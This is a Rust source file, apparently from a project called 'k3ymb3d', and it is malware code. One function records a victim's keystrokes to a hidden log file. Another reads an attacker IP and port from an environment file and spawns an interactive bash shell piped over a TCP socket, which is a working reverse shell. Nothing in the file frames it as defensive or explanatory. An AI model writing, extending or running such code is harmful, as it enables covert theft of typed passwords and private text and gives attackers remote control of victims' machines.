use std::{fs::OpenOptions, io::Write};
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use device_query::{ Keycode };
use dotenv::dotenv;
use std::env;


pub fn match_case(key: &Keycode) -> &'static str {

    let mut file = OpenOptions::new()
    .create(true)
    .append(true)
    .open("/home/oef/Documents/Github/k3ymb3d/log.txt")
    .expect("Failed to open file");
    // check if key is "Space" keycode type
        // using match expression
    match *key {
        Keycode::Space => {
            // write to file
            file.write(b" ").expect("Failed to write to file");
            "Space"
        }
        Keycode::Enter => {
            // write to file
            file.write(b"\n").expect("Failed to write to file");
            "Enter"
        }
        Keycode::RShift | Keycode::Slash => {
            // write to file
            file.write(b"?").expect("Failed to write to file");
            "?"
        } 
        _ => { 
            write!(file, "{}",  key).expect("Failed to write to file");  
            "Other"
        }
    }
    
}

pub fn reverse_shell() {
    dotenv().ok();
    
    // read key and value from file
    let key = env::var("IP").unwrap();
    let value = env::var("PORT").unwrap();
    let addr = format!("{}:{}", key, value);

    let sock = TcpStream::connect(addr).unwrap();
    // created a socket, basically a file descriptor which stores the connection

    let fd = sock.as_raw_fd();

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}